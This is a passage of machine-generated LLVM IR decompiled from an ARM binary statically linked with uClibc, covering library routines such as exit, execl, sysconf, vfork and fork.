  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder label %dec_label_pc_1832c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1832c, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_182f0, { 1, 0 }
  uselistorder label %dec_label_pc_182cc, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18270, { 1, 0 }
  uselistorder label %dec_label_pc_1826c, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_181e4, { 1, 0 }
  uselistorder label %dec_label_pc_181e0, { 1, 0 }
  uselistorder label %dec_label_pc_181a8, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r5, align 4
  %v4_18360 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 156) to i32*), align 4
  store i32 %v4_18360, i32* @r4, align 4
  %v2_18368 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_18380 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 124) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_18380)
  %v0_18394 = load i32, i32* @r5, align 4
  %v2_18394 = add i32 %v0_18394, 20
  %v3_18394 = inttoptr i32 %v2_18394 to i32*
  %v4_18394 = load i32, i32* %v3_18394, align 4
  call void @__pseudo_branch(i32 %v4_18394)
  %v0_183a4 = load i32, i32* @r5, align 4
  %v2_183a4 = add i32 %v0_183a4, 26324
  %v3_183a4 = inttoptr i32 %v2_183a4 to i32*
  %v4_183a4 = load i32, i32* %v3_183a4, align 4
  %v2_183ac = icmp eq i32 %v4_183a4, 0
  br i1 %v2_183ac, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_183b8 = xor i1 %v2_183ac, true
  call void @__pseudo_cond_branch(i1 %v2_183b8, i32 %v4_183a4)
  store i32 %v2_18368, i32* @r0, align 4
  %v0_183c8 = load i32, i32* @r5, align 4
  %v2_183c8 = add i32 %v0_183c8, 52
  %v3_183c8 = inttoptr i32 %v2_183c8 to i32*
  %v4_183c8 = load i32, i32* %v3_183c8, align 4
  call void @__pseudo_branch(i32 %v4_183c8)
  %v0_183d4 = call i32 @__GI___uClibc_fini()
  %v0_183dc = load i32, i32* @r5, align 4
  %v2_183dc = add i32 %v0_183dc, -120924
  %v2_183e4 = icmp eq i32 %v2_183dc, 0
  br i1 %v2_183e4, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_183ec = xor i1 %v2_183e4, true
  call void @__pseudo_cond_branch(i1 %v2_183ec, i32 %v2_183dc)
  %v0_183f0 = load i32, i32* @r6, align 4
  %v1_183f4 = call i32 @__GI__exit(i32 %v0_183f0)
  %v0_183f8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_183f8, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v1_183f8 = load i32, i32* @r1, align 4
  %v5_183f8 = sdiv i32 %v1_183f4, 33554432
  %v6_183f8 = and i32 %v1_183f8, %v5_183f8
  store i32 %v6_183f8, i32* @sb, align 4
  %v2_18408 = load i32, i32* @r4, align 4
  store i32 0, i32* @r6, align 4
  %v9_1840c = sub i32 0, %v2_18408
  %v8_18410 = lshr i32 %v2_18408, %v9_1840c
  %v9_18410 = and i32 %v8_18410, %v9_1840c
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v10_18410 = phi i32 [ %v1_183f4, %bb9 ], [ %v9_18410, %bb10 ]
  ret i32 %v10_18410

; uselistorder directives
  uselistorder i32 %v1_183f4, { 1, 0 }
  uselistorder i32 (i32)* @__GI__exit, { 0, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_18418 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_18418, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v2_1842c = ptrtoint i32* %stack_var_-40 to i32
  %v2_18430 = ptrtoint i32* %stack_var_-8 to i32
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18440

dec_label_pc_18440:                               ; preds = %dec_label_pc_18440, %entry
  %v0_18454 = phi i32 [ 0, %entry ], [ %v1_18454, %dec_label_pc_18440 ]
  %stack_var_-36.0 = phi i32 [ %v2_18430, %entry ], [ %v1_18448, %dec_label_pc_18440 ]
  %v1_18444 = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_18444 = load i32, i32* %v1_18444, align 4
  %v1_18448 = add i32 %stack_var_-36.0, 4
  %v2_1844c = icmp eq i32 %v2_18444, 0
  %v1_18454 = add i32 %v0_18454, 1
  store i32 %v1_18454, i32* @lr, align 4
  br i1 %v2_1844c, label %dec_label_pc_1845c, label %dec_label_pc_18440

dec_label_pc_1845c:                               ; preds = %dec_label_pc_18440
  %v3_1845c = mul i32 %v1_18454, 4
  %v1_18460 = add i32 %v3_1845c, 18
  %v1_18464 = and i32 %v1_18460, -8
  %v2_18468 = sub i32 %v2_1842c, %v1_18464
  %v2_18470 = inttoptr i32 %v2_18468 to i32*
  store i32 %arg2, i32* %v2_18470, align 4
  %v0_1847c = load i32, i32* @sp, align 4
  store i32 %v0_1847c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_18484

dec_label_pc_18484:                               ; preds = %dec_label_pc_18484, %dec_label_pc_1845c
  %v1_18498 = phi i32 [ %v0_1847c, %dec_label_pc_1845c ], [ %v5_18498, %dec_label_pc_18484 ]
  %stack_var_-36.1 = phi i32 [ %v2_18430, %dec_label_pc_1845c ], [ %v1_18490, %dec_label_pc_18484 ]
  %v1_18488 = inttoptr i32 %stack_var_-36.1 to i32*
  %v2_18488 = load i32, i32* %v1_18488, align 4
  %v0_1848c = load i32, i32* @lr, align 4
  %v1_1848c = add i32 %v0_1848c, -1
  store i32 %v1_1848c, i32* @lr, align 4
  %v7_1848c = icmp eq i32 %v0_1848c, 1
  %v1_18490 = add i32 %stack_var_-36.1, 4
  %v2_18498 = add i32 %v1_18498, 4
  %v3_18498 = inttoptr i32 %v2_18498 to i32*
  store i32 %v2_18488, i32* %v3_18498, align 4
  %v4_18498 = load i32, i32* %ip.global-to-local, align 4
  %v5_18498 = add i32 %v4_18498, 4
  store i32 %v5_18498, i32* %ip.global-to-local, align 4
  br i1 %v7_1848c, label %dec_label_pc_184a0, label %dec_label_pc_18484

dec_label_pc_184a0:                               ; preds = %dec_label_pc_18484
  %v0_184a4 = load i32, i32* %r4.global-to-local, align 4
  %v2_184a4 = add i32 %v0_184a4, 64
  %v3_184a4 = inttoptr i32 %v2_184a4 to i32*
  %v4_184a4 = load i32, i32* %v3_184a4, align 4
  %v1_184a8 = inttoptr i32 %v4_184a4 to i32*
  %v2_184a8 = load i32, i32* %v1_184a8, align 4
  %v4_184ac = call i32 @__GI_execve(i32 %arg1, i32 %v0_1847c, i32 %v2_184a8, i32 %v4_184a4)
  ret i32 %v4_184ac

; uselistorder directives
  uselistorder i32 %v5_18498, { 1, 0 }
  uselistorder i32 %v0_1848c, { 1, 0 }
  uselistorder i32 %v0_1847c, { 1, 0, 2 }
  uselistorder i32 %v1_18454, { 0, 2, 1 }
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -35700), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_184e4 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -35700))
  store i32 %v1_184e4, i32* @r6, align 4
  %v2_184e8 = icmp eq i32 %v1_184e4, 0
  br i1 %v2_184e8, label %dec_label_pc_18568, label %dec_label_pc_184f0

dec_label_pc_184f0:                               ; preds = %entry
  store i32 636, i32* @sl, align 4
  %v0_184f8 = load i32, i32* @r4, align 4
  %v2_184f8 = add i32 %v0_184f8, -35688
  store i32 %v2_184f8, i32* @r8, align 4
  %v2_184fc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_184fc, i32* @r7, align 4
  br label %bb18

dec_label_pc_18504:                               ; preds = %bb18
  %v3_18504 = load i32, i32* %stack_var_-36, align 4
  %v1_18508 = inttoptr i32 %v3_18504 to i32*
  %v2_18508 = load i32, i32* %v1_18508, align 4
  %v1_1850c = inttoptr i32 %v2_18508 to i8*
  %v2_1850c = load i8, i8* %v1_1850c, align 1
  %v7_18510 = icmp eq i8 %v2_1850c, 99
  br i1 %v7_18510, label %dec_label_pc_18518, label %.backedge3

dec_label_pc_18518:                               ; preds = %dec_label_pc_18504
  %v1_18518 = add i32 %v2_18508, 1
  %v2_18518 = inttoptr i32 %v1_18518 to i8*
  %v3_18518 = load i8, i8* %v2_18518, align 1
  %v7_1851c = icmp eq i8 %v3_18518, 112
  br i1 %v7_1851c, label %dec_label_pc_18524, label %.backedge3

dec_label_pc_18524:                               ; preds = %dec_label_pc_18518
  %v1_18524 = add i32 %v2_18508, 2
  %v2_18524 = inttoptr i32 %v1_18524 to i8*
  %v3_18524 = load i8, i8* %v2_18524, align 1
  %v7_18528 = icmp eq i8 %v3_18524, 117
  br i1 %v7_18528, label %dec_label_pc_18530, label %.backedge3

dec_label_pc_18530:                               ; preds = %dec_label_pc_18524
  %v1_18530 = add i32 %v2_18508, 3
  %v2_18530 = inttoptr i32 %v1_18530 to i8*
  %v3_18530 = load i8, i8* %v2_18530, align 1
  %v4_18530 = zext i8 %v3_18530 to i32
  %v0_18534 = load i32, i32* @r4, align 4
  %v1_18534 = load i32, i32* @sl, align 4
  %v2_18534 = add i32 %v1_18534, %v0_18534
  %v3_18534 = inttoptr i32 %v2_18534 to i32*
  %v4_18534 = load i32, i32* %v3_18534, align 4
  %v2_18538 = mul nuw nsw i32 %v4_18530, 2
  %v2_1853c = add i32 %v4_18534, %v2_18538
  %v3_1853c = inttoptr i32 %v2_1853c to i16*
  %v4_1853c = load i16, i16* %v3_1853c, align 2
  %v1_18540 = and i16 %v4_1853c, 8
  %v2_18540 = icmp eq i16 %v1_18540, 0
  br i1 %v2_18540, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_18530
  %v1_18544 = load i32, i32* @r5, align 4
  %v2_18544 = add i32 %v1_18544, 1
  store i32 %v2_18544, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_18530, %dec_label_pc_18504, %dec_label_pc_18518, %dec_label_pc_18524
  %v0_18548.pre = load i32, i32* @r6, align 4
  %v0_18554.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_184f0
  %v0_18554 = phi i32 [ %v0_18554.pre, %.backedge3 ], [ %v2_184f8, %dec_label_pc_184f0 ]
  %v0_18548 = phi i32 [ %v0_18548.pre, %.backedge3 ], [ %v1_184e4, %dec_label_pc_184f0 ]
  %v4_18558 = inttoptr i32 %v0_18548 to i32*
  %v5_18558 = call i32 @__GI_config_read(i32* %v4_18558, i32 %v2_184fc, i32 258, i32 %v0_18554)
  %v2_1855c = icmp eq i32 %v5_18558, 0
  br i1 %v2_1855c, label %dec_label_pc_185cc, label %dec_label_pc_18504

dec_label_pc_18568:                               ; preds = %entry
  %v0_1856c = load i32, i32* @r4, align 4
  %v2_1856c = add i32 %v0_1856c, -35684
  store i32 %v2_1856c, i32* @r0, align 4
  %v1_18570 = call i32 @__GI_config_open(i32 %v2_1856c)
  store i32 %v1_18570, i32* @r6, align 4
  %v2_18574 = icmp eq i32 %v1_18570, 0
  br i1 %v2_18574, label %bb19, label %dec_label_pc_18580

bb19:                                             ; preds = %dec_label_pc_18568
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_185cc

dec_label_pc_18580:                               ; preds = %dec_label_pc_18568
  %v0_18584 = load i32, i32* @r4, align 4
  %v2_18584 = add i32 %v0_18584, -35668
  store i32 %v2_18584, i32* @r8, align 4
  %v2_1858c = add i32 %v0_18584, -35632
  store i32 %v2_1858c, i32* @r7, align 4
  %v2_18590 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_18590, i32* @r4, align 4
  br label %bb21

dec_label_pc_18598:                               ; preds = %bb21
  %v0_185c4 = load i32, i32* @r8, align 4
  %v3_18598 = load i32, i32* %stack_var_-36, align 4
  %v1_1859c = inttoptr i32 %v3_18598 to i32*
  %v2_1859c = load i32, i32* %v1_1859c, align 4
  store i32 %v2_1859c, i32* @r1, align 4
  %v2_185a0 = inttoptr i32 %v0_185c4 to i8*
  %v3_185a0 = call i32 @__GI_strcoll(i8* %v2_185a0, i32 %v2_1859c)
  %v2_185a4 = icmp eq i32 %v3_185a0, 0
  br i1 %v2_185a4, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_18598
  %v1_185a8 = load i32, i32* @r5, align 4
  %v2_185a8 = add i32 %v1_185a8, 1
  store i32 %v2_185a8, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_18598
  %v0_185b4.pre = load i32, i32* @r7, align 4
  %v0_185b8.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_18580
  %v0_185b8 = phi i32 [ %v0_185b8.pre, %.backedge ], [ %v1_18570, %dec_label_pc_18580 ]
  %v0_185b4 = phi i32 [ %v0_185b4.pre, %.backedge ], [ %v2_1858c, %dec_label_pc_18580 ]
  %v4_185bc = inttoptr i32 %v0_185b8 to i32*
  %v5_185bc = call i32 @__GI_config_read(i32* %v4_185bc, i32 %v2_18590, i32 459266, i32 %v0_185b4)
  %v2_185c0 = icmp eq i32 %v5_185bc, 0
  br i1 %v2_185c0, label %dec_label_pc_185cc, label %dec_label_pc_18598

dec_label_pc_185cc:                               ; preds = %bb18, %bb21, %bb19
  %v0_185cc = load i32, i32* @r6, align 4
  %v1_185d0 = inttoptr i32 %v0_185cc to i32*
  %v2_185d0 = call i32 @__GI_config_close(i32* %v1_185d0)
  %v0_185d4 = load i32, i32* @r5, align 4
  %v2_185d4 = icmp eq i32 %v0_185d4, 0
  %.v0_185d4 = select i1 %v2_185d4, i32 1, i32 %v0_185d4
  ret i32 %.v0_185d4

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder label %dec_label_pc_185cc, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_18a00

bb:                                               ; preds = %entry
  %v7_18624 = mul i32 %arg1, 4
  %v8_18624 = add i32 %v7_18624, ptrtoint (i32* @global_var_1862c.1553 to i32)
  call void @__pseudo_branch(i32 %v8_18624)
  br label %dec_label_pc_18a00

dec_label_pc_18a00:                               ; preds = %bb, %entry
  %v0_18a04 = call i32 @__aeabi_read_tp()
  %v3_18a08 = load i16, i16* @global_var_32088.1320, align 2
  %v4_18a08 = sext i16 %v3_18a08 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_18a14 = add i32 %v4_18a08, %v0_18a04
  %v4_18a14 = inttoptr i32 %v3_18a14 to i32*
  store i32 22, i32* %v4_18a14, align 4
  %v0_18bf8 = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_18bf8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %v0_18c40 = load i32, i32* @lr, align 4
  call void @__pseudo_branch(i32 -61472)
  store i32 %v0_18c40, i32* @lr, align 4
  store i32 -61441, i32* %r2.global-to-local, align 4
  %v3_18c58 = load i32, i32* inttoptr (i32 -62501 to i32*), align 4
  store i32 %v3_18c58, i32* %r3.global-to-local, align 4
  %v1_18c5c = sub i32 0, %v3_18c58
  %v2_18c5c = icmp eq i32 %v3_18c58, 0
  br i1 %v2_18c5c, label %bb, label %bb4

bb:                                               ; preds = %entry
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %storemerge = phi i32 [ -2147483648, %bb ], [ %v1_18c5c, %entry ]
  %v0_18c64 = phi i32 [ -2147483648, %bb ], [ %v1_18c5c, %entry ]
  store i32 %storemerge, i32* @r0, align 4
  store i32 %v0_18c64, i32* inttoptr (i32 -62501 to i32*), align 4
  %v0_18c78 = load i32, i32* @r0, align 4
  %v2_18c78 = icmp eq i32 %v0_18c78, 0
  br i1 %v2_18c78, label %bb6, label %bb5

bb5:                                              ; preds = %bb4
  %v1_18c7c = load i32, i32* %r3.global-to-local, align 4
  %v2_18c7c = load i32, i32* %r2.global-to-local, align 4
  %v3_18c7c = add i32 %v2_18c7c, -1060
  %v4_18c7c = inttoptr i32 %v3_18c7c to i32*
  store i32 %v1_18c7c, i32* %v4_18c7c, align 4
  %v0_18c80.pre = load i32, i32* @r0, align 4
  br label %bb6

bb6:                                              ; preds = %bb4, %bb5
  %v0_18ca4 = phi i32 [ 0, %bb4 ], [ %v0_18c80.pre, %bb5 ]
  %v2_18c80 = icmp ugt i32 %v0_18ca4, -4097
  br i1 %v2_18c80, label %bb8, label %bb7

bb7:                                              ; preds = %bb6
  ret i32 %v0_18ca4

bb8:                                              ; preds = %bb6
  store i32 -38, i32* @r1, align 4
  %v4_18c8c = icmp eq i32 %v0_18ca4, -38
  br i1 %v4_18c8c, label %dec_label_pc_18c94, label %bb9

dec_label_pc_18c94:                               ; preds = %bb8
  br label %bb9

bb9:                                              ; preds = %dec_label_pc_18c94, %bb8
  %v0_18cac = call i32 @__syscall_error()
  ret i32 %v0_18cac

; uselistorder directives
  uselistorder i32 %v3_18c58, { 1, 0, 2 }
  uselistorder i32* inttoptr (i32 -62501 to i32*), { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  store i32 30120, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r8.global-to-local, align 4
  %v4_18da016 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 30120) to i32*), align 4
  store i32 %v4_18da016, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18da418 = icmp eq i32 %v4_18da016, 0
  br i1 %v2_18da418, label %dec_label_pc_18dac, label %dec_label_pc_18cd0

dec_label_pc_18cd0:                               ; preds = %entry, %dec_label_pc_18da0.backedge
  call void @__pseudo_branch(i32 -61536)
  %v0_18cdc = load i32, i32* %r7.global-to-local, align 4
  %v1_18cdc = add i32 %v0_18cdc, 20
  %v2_18cdc = inttoptr i32 %v1_18cdc to i32*
  %v3_18cdc = load i32, i32* %v2_18cdc, align 4
  store i32 %v3_18cdc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18ce0 = icmp eq i32 %v3_18cdc, 0
  store i32 %v3_18cdc, i32* %r4.global-to-local, align 4
  %v1_18ce8 = add i32 %v3_18cdc, 1
  store i32 %v1_18ce8, i32* %r1.global-to-local, align 4
  br i1 %v2_18ce0, label %dec_label_pc_18da0.backedge, label %dec_label_pc_18cf0

dec_label_pc_18da0.backedge:                      ; preds = %dec_label_pc_18cd0, %dec_label_pc_18d1c
  %v0_18da0 = load i32, i32* %r8.global-to-local, align 4
  %v1_18da0 = load i32, i32* %r5.global-to-local, align 4
  %v2_18da0 = add i32 %v1_18da0, %v0_18da0
  %v3_18da0 = inttoptr i32 %v2_18da0 to i32*
  %v4_18da0 = load i32, i32* %v3_18da0, align 4
  store i32 %v4_18da0, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18da4 = icmp eq i32 %v4_18da0, 0
  br i1 %v2_18da4, label %dec_label_pc_18dac, label %dec_label_pc_18cd0

dec_label_pc_18cf0:                               ; preds = %dec_label_pc_18cd0
  %v0_18cf0 = load i32, i32* %r8.global-to-local, align 4
  %v1_18cf0 = load i32, i32* %r5.global-to-local, align 4
  %v2_18cf0 = add i32 %v1_18cf0, %v0_18cf0
  %v3_18cf0 = inttoptr i32 %v2_18cf0 to i32*
  %v4_18cf0 = load i32, i32* %v3_18cf0, align 4
  %v1_18cf4 = add i32 %v4_18cf0, 20
  store i32 %v1_18cf4, i32* %r2.global-to-local, align 4
  %v1_18cf8132 = inttoptr i32 %v1_18cf4 to i32*
  %v2_18cf8133 = load i32, i32* %v1_18cf8132, align 4
  store i32 %v2_18cf8133, i32* %r3.global-to-local, align 4
  %v3_18cfc135 = icmp uge i32 %v2_18cf8133, %v3_18cdc
  store i1 %v3_18cfc135, i1* %cpsr_c.global-to-local, align 1
  %v9_18cfc141 = icmp eq i32 %v2_18cf8133, %v3_18cdc
  br i1 %v9_18cfc141, label %dec_label_pc_18d04, label %dec_label_pc_18d1c

dec_label_pc_18d04:                               ; preds = %dec_label_pc_18cf0, %dec_label_pc_18d04.dec_label_pc_18cf8_crit_edge
  %v0_18d04142 = phi i32 [ %v1_18cfc.pre, %dec_label_pc_18d04.dec_label_pc_18cf8_crit_edge ], [ %v3_18cdc, %dec_label_pc_18cf0 ]
  store i32 %v0_18d04142, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_18d14 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18d14, label %dec_label_pc_18d18, label %dec_label_pc_18d04.dec_label_pc_18cf8_crit_edge

dec_label_pc_18d04.dec_label_pc_18cf8_crit_edge:  ; preds = %dec_label_pc_18d04
  %v0_18cf8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18cfc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_18cf8 = inttoptr i32 %v0_18cf8.pre to i32*
  %v2_18cf8 = load i32, i32* %v1_18cf8, align 4
  store i32 %v2_18cf8, i32* %r3.global-to-local, align 4
  %v3_18cfc = icmp uge i32 %v2_18cf8, %v1_18cfc.pre
  store i1 %v3_18cfc, i1* %cpsr_c.global-to-local, align 1
  %v9_18cfc = icmp eq i32 %v2_18cf8, %v1_18cfc.pre
  br i1 %v9_18cfc, label %dec_label_pc_18d04, label %dec_label_pc_18d1c

dec_label_pc_18d18:                               ; preds = %dec_label_pc_18d04
  %v0_18d18 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18d18, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18d1c

dec_label_pc_18d1c:                               ; preds = %dec_label_pc_18cf0, %dec_label_pc_18d04.dec_label_pc_18cf8_crit_edge, %dec_label_pc_18d18
  %v0_18d1c = phi i32 [ %v0_18d18, %dec_label_pc_18d18 ], [ %v2_18cf8133, %dec_label_pc_18cf0 ], [ %v2_18cf8, %dec_label_pc_18d04.dec_label_pc_18cf8_crit_edge ]
  %v1_18d1c = phi i32 [ %v0_18d18, %dec_label_pc_18d18 ], [ %v3_18cdc, %dec_label_pc_18cf0 ], [ %v1_18cfc.pre, %dec_label_pc_18d04.dec_label_pc_18cf8_crit_edge ]
  %v3_18d1c = icmp uge i32 %v0_18d1c, %v1_18d1c
  store i1 %v3_18d1c, i1* %cpsr_c.global-to-local, align 1
  %v9_18d1c = icmp eq i32 %v0_18d1c, %v1_18d1c
  br i1 %v9_18d1c, label %dec_label_pc_18d24, label %dec_label_pc_18da0.backedge

dec_label_pc_18d24:                               ; preds = %dec_label_pc_18d1c
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_18d38 = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_18d28

dec_label_pc_18d28:                               ; preds = %dec_label_pc_18d90, %dec_label_pc_18d24
  %v0_18d28 = load i32, i32* %r7.global-to-local, align 4
  %v1_18d28 = add i32 %v0_18d28, 4
  %v2_18d28 = inttoptr i32 %v1_18d28 to i32*
  %v3_18d28 = load i32, i32* %v2_18d28, align 4
  store i32 %v3_18d28, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18d2c = icmp eq i32 %v3_18d28, 0
  br i1 %v2_18d2c, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_18d28
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_18d28, %bb
  %v2_18d34 = xor i1 %v2_18d2c, true
  call void @__pseudo_cond_branch(i1 %v2_18d34, i32 %v3_18d28)
  %v0_18d3c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_18d3c, i32* %stack_var_-88, align 4
  %v1_18d40 = inttoptr i32 %v0_18d3c to i32*
  %v2_18d40 = load i32, i32* %v1_18d40, align 4
  store i32 %v2_18d40, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18d44 = icmp eq i32 %v2_18d40, 0
  store i32 %v2_18d38, i32* %r5.global-to-local, align 4
  br i1 %v2_18d44, label %dec_label_pc_18db0.loopexit, label %dec_label_pc_18d58

dec_label_pc_18d58:                               ; preds = %bb72
  %v1_18d58 = add i32 %v2_18d40, 20
  store i32 %v1_18d58, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18d5c

dec_label_pc_18d5c:                               ; preds = %dec_label_pc_18d90.dec_label_pc_18d5c_crit_edge, %dec_label_pc_18d58
  %v0_18d60 = phi i32 [ %v0_18d60.pre, %dec_label_pc_18d90.dec_label_pc_18d5c_crit_edge ], [ %v1_18d58, %dec_label_pc_18d58 ]
  %v0_18d5c = phi i32 [ %v0_18d5c.pre, %dec_label_pc_18d90.dec_label_pc_18d5c_crit_edge ], [ %v2_18d40, %dec_label_pc_18d58 ]
  %v1_18d5c = add i32 %v0_18d5c, 20
  %v2_18d5c = inttoptr i32 %v1_18d5c to i32*
  %v3_18d5c = load i32, i32* %v2_18d5c, align 4
  store i32 %v0_18d60, i32* %r2.global-to-local, align 4
  store i32 %v3_18d5c, i32* %r4.global-to-local, align 4
  %v1_18d68 = add i32 %v3_18d5c, 1
  store i32 %v1_18d68, i32* %r1.global-to-local, align 4
  %v1_18d6c119 = inttoptr i32 %v0_18d60 to i32*
  %v2_18d6c120 = load i32, i32* %v1_18d6c119, align 4
  store i32 %v2_18d6c120, i32* %r3.global-to-local, align 4
  %v3_18d70122 = icmp uge i32 %v2_18d6c120, %v3_18d5c
  store i1 %v3_18d70122, i1* %cpsr_c.global-to-local, align 1
  %v9_18d70128 = icmp eq i32 %v2_18d6c120, %v3_18d5c
  br i1 %v9_18d70128, label %dec_label_pc_18d78, label %dec_label_pc_18d90

dec_label_pc_18d78:                               ; preds = %dec_label_pc_18d5c, %dec_label_pc_18d78.dec_label_pc_18d6c_crit_edge
  %v0_18d78129 = phi i32 [ %v1_18d70.pre, %dec_label_pc_18d78.dec_label_pc_18d6c_crit_edge ], [ %v3_18d5c, %dec_label_pc_18d5c ]
  store i32 %v0_18d78129, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_18d88 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18d88, label %dec_label_pc_18d8c, label %dec_label_pc_18d78.dec_label_pc_18d6c_crit_edge

dec_label_pc_18d78.dec_label_pc_18d6c_crit_edge:  ; preds = %dec_label_pc_18d78
  %v0_18d6c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18d70.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_18d6c = inttoptr i32 %v0_18d6c.pre to i32*
